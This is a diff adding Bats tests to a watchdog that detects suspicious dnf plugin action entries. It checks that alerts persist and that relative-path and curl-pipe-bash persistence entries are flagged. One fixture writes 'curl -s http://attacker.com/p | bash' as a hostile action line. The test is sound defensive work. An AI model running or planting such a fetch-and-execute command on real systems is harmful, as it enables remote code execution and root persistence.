@@ -218,3 +218,36 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     main_count=$(cap | grep -cE '^-t selfdef-dnf-plugins -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): dnf-plugins-watchdog does NOT refresh baseline on suspicious-action detection — alert STAYS until operator updates" {
+    # Post-transaction root-exec persistence — suspicious-action alert
+    # MUST persist across runs until operator explicitly re-baselines.
+    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
+    run_wd
+    printf '*:in:/tmp/.x\n' > "${ACTION}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"dnf_plugins_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (relative-with-slash action 'sub/dir/p' → alert)" {
+    # Relative-with-slash = PWD-at-exec attacker primitive.
+    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '*:in:sub/dir/evil\n' > "${ACTION}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '*:in:curl -s http://attacker.com/p | bash\n' > "${ACTION}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
